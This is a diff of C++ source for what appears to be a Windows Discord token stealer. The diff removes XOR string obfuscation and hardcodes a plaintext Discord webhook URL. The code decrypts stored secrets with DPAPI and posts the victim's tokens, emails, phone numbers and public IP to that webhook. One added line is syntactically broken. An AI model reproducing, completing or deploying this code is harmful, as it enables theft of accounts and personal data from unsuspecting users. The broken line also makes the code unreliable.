@@ -25,22 +25,8 @@
 namespace fs = std::filesystem;
 using json = nlohmann::json;
 
-const char* const _Wb = "https://discord.com/api/webhooks/1573595682634465314/NW6nQ5gqBKWgBazoucAQXTKQ9oeRUakiznXDrk5DC-wDJKeRIapPkzAxuD1ea9lX6Sdb";
-const size_t _WbL = sizeof(_Wb) - 1;
-
-std::string Dec(const char* enc, size_t len) {
-    std::string s(len, '\0');
-    for (size_t i = 0; i < len; ++i) s[i] = enc[i] ^ 0x7A;
-    return s;
-}
-
-std::wstring DecW(const char* enc, size_t len) {
-    std::string s = Dec(enc, len);
-    int n = MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), nullptr, 0);
-    std::wstring w(n, 0);
-    MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), w.data(), n);
-    return w;
-}
+// 테스트용 평문 웹훅 주소 (여기에 니 주소 넣어)
+const std::wstring WEBHOOK_URL = L"https://discord.com/api/webhooks/1573595682634465314/NW6nQ5gqBKWgBazoucAQXTKQ9oeRUakiznXDrk5DC-wDJKeRIapPkzAxuD1ea9lX6Sdb";
 
 std::wstring GetLocalAppData() {
     wchar_t* path = nullptr;
@@ -70,31 +56,21 @@ struct WinHttpAPI {
 } api;
 
 bool InitAPI() {
-    HMODULE hWinHttp = LoadLibraryA(Dec("\x09\x17\x1a\x16\x0d\x0f\x0f\x0f\x1e\x0b\x40\x11\x16\x16", 14).c_str());
+    HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
     if (!hWinHttp) return false;
-    HMODULE hCrypt = LoadLibraryA(Dec("\x0f\x19\x14\x1b\x10\x0d\x0d\x0f\x1e\x0b\x40\x11\x16\x16", 14).c_str());
+    HMODULE hCrypt = LoadLibraryA("crypt32.dll");
     if (!hCrypt) return false;
 
-    api.Open = (pWinHttpOpen)GetProcAddress(hWinHttp, Dec("\x09\x17\x1a\x16\x0d\x0f\x0f\x1e\x0b\x16\x1b\x14\x1a", 14).c_str());
-    api.Connect = (pWinHttpConnect)GetProcAddress(hWinHttp, Dec("\x09\x17\x1a\x16\x0d\x0f\x0f\x1e\x0b\x10\x19\x14\x14\x1a\x0f\x0f", 15).c_str());
-    api.OpenReq = (pWinHttpOpenRequest)GetProcAddress(hWinHttp, Dec("\x09\x17\x1a\x16\x0d\x0f\x0f\x1e\x0b\x1e\x0f\x1a\x14\x08\x1a\x13\x11\x0f\x0c", 18).c_str());
-    api.Send = (pWinHttpSendRequest)GetProcAddress(hWinHttp, Dec("\x09\x17\x1a\x16\x0d\x0f\x0f\x1e\x0b\x12\x1a\x14\x1b\x08\x14\x1a\x0f\x0c", 18).c_str());
-    api.Recv = (pWinHttpReceiveResponse)GetProcAddress(hWinHttp, Dec("\x09\x17\x1a\x16\x0d\x0f\x0f\x1e\x0b\x19\x1a\x0f\x1a\x15\x0b\x1a\x08\x1a\x12\x11\x14\x14\x0f\x1a", 22).c_str());
-    api.Avail = (pWinHttpQueryDataAvailable)GetProcAddress(hWinHttp, Dec("\x09\x17\x1a\x16\x0d\x0f\x0f\x1e\x0b\x18\x0c\x0f\x19\x1c\x10\x13\x0c\x0c\x14\x0c\x16\x0b\x1c\x0f\x0c\x0f", 22).c_str());
-    api.Read = (pWinHttpReadData)GetProcAddress(hWinHttp, Dec("\x09\x17\x1a\x16\x0d\x0f\x0f\x1e\x0b\x19\x0f\x0c\x1b\x10\x0c\x0c\x14\x0c\x16\x0b\x1c\x0f\x0c\x0f", 22).c_str());
-    api.Close = (pWinHttpCloseHandle)GetProcAddress(hWinHttp, Dec("\x09\x17\x1a\x16\x0d\x0f\x0f\x1e\x0b\x10\x16\x1c\x0f\x0b\x1a\x10\x14\x0f\x16\x0f", 22).c_str());
-    api.AddHdr = (pWinHttpAddRequestHeaders)GetProcAddress(hWinHttp, Dec("\x09\x17\x1a\x16\x0d\x0f\x0f\x1e\x0b\x13\x0c\x0c\x16\x0f\x14\x12\x1b\x0f\x11\x1b\x1c\x1b\x10\x0f\x14\x10\x11\x0c\x0c\x14\x0c\x16\x0b\x1c\x0f\x0c\x0f", 38).c_str());
-    
-    if (!api.Open) api.Open = (pWinHttpOpen)GetProcAddress(hWinHttp, "WinHttpOpen");
-    if (!api.Connect) api.Connect = (pWinHttpConnect)GetProcAddress(hWinHttp, "WinHttpConnect");
-    if (!api.OpenReq) api.OpenReq = (pWinHttpOpenRequest)GetProcAddress(hWinHttp, "WinHttpOpenRequest");
-    if (!api.Send) api.Send = (pWinHttpSendRequest)GetProcAddress(hWinHttp, "WinHttpSendRequest");
-    if (!api.Recv) api.Recv = (pWinHttpReceiveResponse)GetProcAddress(hWinHttp, "WinHttpReceiveResponse");
-    if (!api.Avail) api.Avail = (pWinHttpQueryDataAvailable)GetProcAddress(hWinHttp, "WinHttpQueryDataAvailable");
-    if (!api.Read) api.Read = (pWinHttpReadData)GetProcAddress(hWinHttp, "WinHttpReadData");
-    if (!api.Close) api.Close = (pWinHttpCloseHandle)GetProcAddress(hWinHttp, "WinHttpCloseHandle");
-    if (!api.AddHdr) api.AddHdr = (pWinHttpAddRequestHeaders)GetProcAddress(hWinHttp, "WinHttpAddRequestHeaders");
-    if (!api.DPAPI) api.DPAPI = (pCryptUnprotectData)GetProcAddress(hCrypt, "CryptUnprotectData");
+    api.Open = (pWinHttpOpen)GetProcAddress(hWinHttp, "WinHttpOpen");
+    api.Connect = (pWinHttpConnect)GetProcAddress(hWinHttp, "WinHttpConnect");
+    api.OpenReq = (pWinHttpOpenRequest)GetProcAddress(hWinHttp, "WinHttpOpenRequest");
+    api.Send = (pWinHttpSendRequest)GetProcAddress(hWinHttp, "WinHttpSendRequest");
+    api.Recv = (pWinHttpReceiveResponse)GetProcAddress(hWinHttp, "WinHttpReceiveResponse");
+    api.Avail = (pWinHttpQueryDataAvailable)GetProcAddress(hWinHttp, "WinHttpQueryDataAvailable");
+    api.Read = (pWinHttpReadData)GetProcAddress(hWinHttp, "WinHttpReadData");
+    api.Close = (pWinHttpCloseHandle)GetProcAddress(hWinHttp, "WinHttpCloseHandle");
+    api.AddHdr = (pWinHttpAddRequestHeaders)GetProcAddress(hWinHttp, "WinHttpAddRequestHeaders");
+    api.DPAPI = (pCryptUnprotectData)GetProcAddress(hCrypt, "CryptUnprotectData");
 
     return api.Open && api.Connect && api.OpenReq && api.Send && api.Recv && api.Avail && api.Read && api.Close && api.AddHdr && api.DPAPI;
 }
@@ -250,13 +226,10 @@ std::string DiscordGet(const std::string& token, LPCWSTR path) {
 }
 
 void SendWebhook(const json& payload) {
-    std::string decUrl = Dec(_Wb, _WbL);
-    std::wstring wUrl(decUrl.begin(), decUrl.end());
-    
     HINTERNET s = api.Open(L"x/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     HINTERNET c = api.Connect(s, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
     
-    std::wstring path = wUrl.substr(wUrl.find(L"/api/"));
+    std::wstring path = WEBHOOK_URL.substr(WEBHOOK_URL.find(L"/api/"));
     HINTERNET r = api.OpenReq(c, L"POST", path.c_str(), nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
     
     std::wstring hdr = L"Content-Type: application/json\r\n";
@@ -315,7 +288,7 @@ int main() {
                     {{"name", "Public IP"}, {"value", HttpGet(L"api.ipify.org", L"/")}, {"inline", true}},
                     {{"name", "Local IP"}, {"value", "check_manually"}, {"inline", true}},
                     {{"name", "Emails"}, {"value", emails.empty() ? "none" : emails.dump()}, {"inline", false}},
-                    {{"name", "Phones"}, {"value", phones.empty() ? "none" : phones.dump()}, {"inline", false}},
+                    {{"name", "Phones"}, {"value": phones.empty() ? "none" : phones.dump()}, {"inline", false}},
                     {{"name", "Tokens"}, {"value", accounts.dump(2)}, {"inline", false}}
                 })}
             }
